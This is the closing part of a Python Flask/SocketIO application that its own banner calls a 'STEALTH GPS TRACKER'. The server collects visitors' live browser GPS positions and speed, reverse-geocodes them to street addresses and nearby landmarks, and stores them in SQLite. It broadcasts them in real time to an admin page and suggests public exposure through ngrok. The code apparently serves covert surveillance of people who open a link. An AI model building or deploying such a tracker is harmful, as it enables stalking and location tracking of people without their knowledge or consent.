                    🌍 ${coord.translation.country || 'N/A'} | 📮 ${coord.translation.postcode || 'N/A'}<br><br>
                    <b>🏪 Nearby Landmarks (${coord.translation.nearby_landmarks?.length || 0}):</b><br>
                    ${coord.translation.nearby_landmarks?.slice(0, 8).map(l => `📍 ${l.name} (${l.type})`).join('<br>') || 'None'}
                </div>
            `).openPopup();
        }
    };

    // Periodic refresh for coords tab
    setInterval(() => {
        if (currentTab === 'coords') renderCoords();
    }, 5000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return CLIENT_HTML

@app.route('/admin')
def admin():
    return ADMIN_HTML

@app.route('/api/reverse/<lat>/<lon>')
def api_reverse(lat, lon):
    return jsonify(translate_coordinates(lat, lon))

@app.route('/api/stats')
def api_stats():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Get active users (last seen within 60 seconds)
    cursor.execute("SELECT * FROM users WHERE last_seen > ?", (int(time.time() - 60),))
    active_users_db = cursor.fetchall()
    active_users = {}
    for row in active_users_db:
        active_users[row[0]] = {
            'session': row[0],
            'lat': row[1],
            'lng': row[2],
            'accuracy': row[3],
            'speed': row[4],
            'timestamp': row[5],
            'street': row[10],
            'nearby_landmarks': json.loads(row[11]) if row[11] else []
        }
    
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total': total_users,
        'active': len(active_users),
        'users': dict(sorted(active_users.items(), key=lambda x: x[1].get('timestamp', ''), reverse=True)[:20])
    })

@socketio.on('gps_update')
def handle_gps_update(data):
    global last_broadcast
    session = data['session']
    now = time.time()
    
    # Update user data
    translation = translate_coordinates(data['lat'], data['lng'])
    
    user_data = {
        'lat': data['lat'],
        'lng': data['lng'],
        'accuracy': data.get('accuracy', 0),
        'speed': data.get('speed', 0),
        'timestamp': datetime.now().isoformat(),
        'street': translation.get('street', 'Unknown'),
        'nearby_landmarks': translation.get('nearby_landmarks', []),
        'city': translation.get('city', ''),
        'state': translation.get('state', ''),
        'country': translation.get('country', ''),
        'postal_code': translation.get('postcode', ''),
        'last_seen': int(now)
    }
    
    tracked_users[session] = user_data
    
    # Save to database
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Update/insert user
    cursor.execute('''
        INSERT OR REPLACE INTO users 
        (session_id, lat, lon, accuracy, speed, timestamp, city, state, country, postal_code, street, nearby_landmarks, last_seen)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        session, user_data['lat'], user_data['lng'], user_data['accuracy'], user_data['speed'],
        user_data['timestamp'], user_data['city'], user_data['state'], user_data['country'],
        user_data['postal_code'], user_data['street'], json.dumps(user_data['nearby_landmarks']),
        user_data['last_seen']
    ))
    
    # Store coordinate
    coord_id = str(uuid.uuid4())[:8]
    cursor.execute('''
        INSERT INTO coordinates 
        (id, session_id, lat, lon, accuracy, speed, timestamp, city, state, country, postal_code, street, nearby_landmarks)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        coord_id, session, data['lat'], data['lng'], data.get('accuracy', 0), data.get('speed', 0),
        datetime.now().isoformat(), translation.get('city', ''), translation.get('state', ''),
        translation.get('country', ''), translation.get('postcode', ''), translation.get('street', ''),
        json.dumps(translation.get('nearby_landmarks', []))
    ))
    
    conn.commit()
    conn.close()
    
    # Throttled broadcasting (every 2 seconds max)
    if now - last_broadcast > 2:
        emit('location_update', {
            **data,
            **user_data
        }, broadcast=True)
        
        # Stats update
        active_cutoff = now - 60
        emit('stats_update', {
            'total': len(tracked_users),
            'active': len([u for u in tracked_users.values() if u['last_seen'] > active_cutoff]),
            'users': dict(sorted(tracked_users.items(), key=lambda x: x[1]['last_seen'], reverse=True)[:20])
        }, broadcast=True)
        last_broadcast = now
    
    emit('coord_update', {
        'id': coord_id,
        'lat': data['lat'],
        'lon': data['lng'],
        'session': session,
        'timestamp': datetime.now().isoformat(),
        'translation': translation
    }, broadcast=True)

if __name__ == '__main__':
    print("🚀 STEALTH GPS TRACKER v2.2 - DATABASE + RED LANDMARKS")
    print("📱 Client: http://localhost:5000")
    print("🕵️  Admin: http://localhost:5000/admin") 
    print("💾 Database: gps_tracker.db")
    print("🌐 Public: ngrok http 5000")
    print("✅ SQLite database | Red critical landmarks | 500m radius")
    
